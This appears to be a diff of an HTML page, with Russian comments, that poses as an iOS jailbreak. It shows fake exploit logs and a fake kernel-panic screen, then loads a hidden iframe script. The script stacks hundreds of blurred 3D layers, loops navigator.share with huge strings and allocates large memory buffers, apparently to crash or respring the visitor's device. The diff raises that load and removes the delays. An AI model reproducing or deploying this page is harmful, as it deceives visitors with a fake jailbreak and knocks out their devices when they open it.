@@ -7,103 +7,42 @@
     <style>
         body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-            margin: 0;
-            height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            background: #000;
+            margin: 0; height: 100vh; display: flex; justify-content: center; align-items: center;
+            background: #000; color: white; overflow: hidden;
             background: linear-gradient(135deg, #000000 0%, #0a0a2e 50%, #000000 100%);
-            background-size: 400% 400%;
-            animation: gradientBG 15s ease infinite;
-            color: white;
-            overflow: hidden;
+            background-size: 400% 400%; animation: gradientBG 15s ease infinite;
         }
 
-        @keyframes gradientBG {
-            0% { background-position: 0% 50%; }
-            50% { background-position: 100% 50%; }
-            100% { background-position: 0% 50%; }
-        }
+        @keyframes gradientBG { 0% { background-position: 0% 50%; } 50% { background-position: 100% 50%; } 100% { background-position: 0% 50%; } }
 
         .main-card {
-            background: rgba(255, 255, 255, 0.05);
-            backdrop-filter: blur(20px);
-            -webkit-backdrop-filter: blur(20px);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            border-radius: 30px;
-            padding: 30px;
-            width: 85%;
-            max-width: 400px;
-            text-align: center;
-            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.5);
-            position: relative;
-            z-index: 10;
+            background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(20px); -webkit-backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 30px; padding: 30px;
+            width: 85%; max-width: 400px; text-align: center; box-shadow: 0 20px 50px rgba(0, 0, 0, 0.5);
         }
 
-        h1 {
-            font-size: 1.6rem;
-            margin: 0 0 15px 0;
-            background: linear-gradient(to bottom, #fff, #888);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-        }
+        h1 { font-size: 1.6rem; margin: 0 0 15px 0; background: linear-gradient(to bottom, #fff, #888); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
 
-        .progress-container {
-            background: rgba(255, 255, 255, 0.1);
-            border-radius: 10px;
-            height: 6px;
-            width: 100%;
-            margin-bottom: 20px;
-            overflow: hidden;
-        }
-        .progress-bar {
-            width: 0%;
-            height: 100%;
-            background: #fff;
-            box-shadow: 0 0 15px rgba(255, 255, 255, 0.5);
-        }
+        .progress-container { background: rgba(255, 255, 255, 0.1); border-radius: 10px; height: 6px; width: 100%; margin-bottom: 20px; overflow: hidden; }
+        .progress-bar { width: 0%; height: 100%; background: #fff; box-shadow: 0 0 15px rgba(255, 255, 255, 0.5); }
 
         #console {
-            background: rgba(0, 0, 0, 0.4);
-            border-radius: 15px;
-            padding: 12px;
-            height: 180px;
-            font-family: 'Courier New', Courier, monospace;
-            font-size: 10px;
-            color: #00ff00;
-            text-align: left;
-            overflow-y: hidden;
-            border: 1px solid rgba(0, 255, 0, 0.1);
+            background: rgba(0, 0, 0, 0.4); border-radius: 15px; padding: 12px; height: 180px;
+            font-family: 'Courier New', Courier, monospace; font-size: 10px; color: #00ff00;
+            text-align: left; overflow: hidden; border: 1px solid rgba(0, 255, 0, 0.1);
         }
 
         .line { margin-bottom: 3px; opacity: 0; animation: fadeIn 0.1s forwards; }
         @keyframes fadeIn { to { opacity: 1; } }
 
+        /* Экран мгновенной смерти */
         #panic-screen {
-            display: none;
-            position: fixed;
-            top: 0; left: 0;
-            width: 100%; height: 100%;
-            background: #000;
-            color: #ff3b30;
-            font-size: 9px;
-            word-break: break-all;
-            padding: 10px;
-            z-index: 100;
+            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: #ff3b30; color: #fff; font-size: 8px; word-break: break-all;
+            padding: 0; z-index: 1000; overflow: hidden;
         }
 
-        .credits {
-            position: fixed;
-            bottom: 15px;
-            width: 100%;
-            text-align: center;
-            font-size: 9px;
-            color: #555;
-            z-index: 200;
-        }
-        .credits a { color: #1ad2dc; text-decoration: none; }
-
+        .credits { position: fixed; bottom: 15px; width: 100%; text-align: center; font-size: 9px; color: #555; z-index: 200; }
         #respring-iframe { position: fixed; opacity: 0.01; pointer-events: none; }
     </style>
 </head>
@@ -111,19 +50,13 @@
 
     <div id="terminal" class="main-card">
         <h1>Exploiting System...</h1>
-        
-        <div class="progress-container">
-            <div id="bar" class="progress-bar"></div>
-        </div>
-
+        <div class="progress-container"><div id="bar" class="progress-bar"></div></div>
         <div id="console"></div>
     </div>
 
     <div id="panic-screen"></div>
 
-    <div class="credits">
-        © 2026 <b>neonmodder123</b> | Licensed under <a href="https://opensource.org/license/mit/" target="_blank">MIT</a>
-    </div>
+    <div class="credits">© 2026 <b>neonmodder123</b> | MIT License</div>
 
     <iframe id="respring-iframe" sandbox="allow-forms allow-modals allow-scripts allow-same-origin"></iframe>
 
@@ -137,13 +70,10 @@
             "> Success. Escaping sandbox...",
             "> Gaining TFP0 port...",
             "> Found offset: 0xfffffff007004000",
-            "> Patching amfi_allow_any_signature...",
+            "> Patching amfi_signatures...",
             "> Injecting bootstrap...",
-            "> Running: /usr/libexec/jailbreakd",
             "> Mapping I/O surfaces...",
             "> Overwriting memory at 0x1c3a0...",
-            "> Creating snapshot...",
-            "> Checking system integrity...",
             "> [CRITICAL] WebKit memory leak!",
             "> Triggering emergency panic..."
         ];
@@ -153,47 +83,40 @@
         const consoleEl = document.getElementById('console');
         const panicScreen = document.getElementById('panic-screen');
 
-        // Полоска на 2 секунды (100 шагов по 20мс = 2000мс)
+        // Полоска за 2 секунды
         const loadInterval = setInterval(() => {
             barWidth += 1;
             bar.style.width = barWidth + "%";
-            
-            if (barWidth >= 100) {
-                clearInterval(loadInterval);
-            }
+            if (barWidth >= 100) clearInterval(loadInterval);
         }, 20);
 
-        // Логи начинаются СРАЗУ (одновременно с полоской)
         function startLogs(index) {
             if (index < logs.length) {
                 const div = document.createElement('div');
                 div.className = 'line';
                 div.innerText = logs[index];
                 consoleEl.appendChild(div);
-                
-                // Автопрокрутка консоли вниз
                 consoleEl.scrollTop = consoleEl.scrollHeight;
-
-                // Быстрая печать логов (каждые 120мс)
-                setTimeout(() => startLogs(index + 1), 120);
+                setTimeout(() => startLogs(index + 1), 100);
             } else {
-                // Ждем небольшую паузу после всех логов и уходим в панику
-                setTimeout(triggerPanic, 400);
+                // МГНОВЕННЫЙ ПЕРЕХОД
+                triggerInstantPanic();
             }
         }
 
-        function triggerPanic() {
-            document.getElementById('terminal').style.display = 'none';
+        function triggerInstantPanic() {
+            // Заполняем экран текстом заранее (невидимо)
+            let trapText = "";
+            for(let i=0; i<2000; i++) {
+                trapText += "FATAL_ERR:0x" + Math.floor(Math.random()*16777215).toString(16) + " ";
+            }
+            panicScreen.innerText = trapText;
+            
+            // Показываем экран и СРАЗУ запускаем тяжелый скрипт
             panicScreen.style.display = 'block';
             
-            const panicEffect = setInterval(() => {
-                panicScreen.innerText += " ERR:0x" + Math.floor(Math.random()*16777215).toString(16) + " [MEM_CORRUPT]";
-            }, 15);
-
-            setTimeout(() => {
-                clearInterval(panicEffect);
-                executeRespring();
-            }, 2000);
+            // Нулевая задержка перед респрингом
+            setTimeout(executeRespring, 10);
         }
 
         function executeRespring() {
@@ -202,18 +125,19 @@
                 const c = document.createElement('div');
                 c.style.cssText = 'perspective: 1px; perspective-origin: 99% 99%;';
                 document.body.appendChild(c);
-                for (let i = 0; i < 500; i++) {
+                for (let i = 0; i < 600; i++) {
                     let d = document.createElement('div');
                     d.style.cssText = 'position:absolute; width:100vw; height:100vh; backdrop-filter:blur(100px); -webkit-backdrop-filter:blur(100px); transform:translate3d(100px,100px,'+i+'px);';
                     c.appendChild(d);
                 }
                 setInterval(() => {
-                    try { navigator.share({title:'R', text:'R'.repeat(100000)}); } catch(e){}
+                    try { navigator.share({title:'R', text:'R'.repeat(200000)}); } catch(e){}
+                    let x = new Uint8Array(1024 * 1024 * 40); // Увеличил нагрузку на ОЗУ
+                    crypto.getRandomValues(x);
                 }, 0);
             <\/script></body></html>`;
         }
 
-        // Запуск логов сразу при загрузке
         window.onload = () => startLogs(0);
     </script>
 </body>
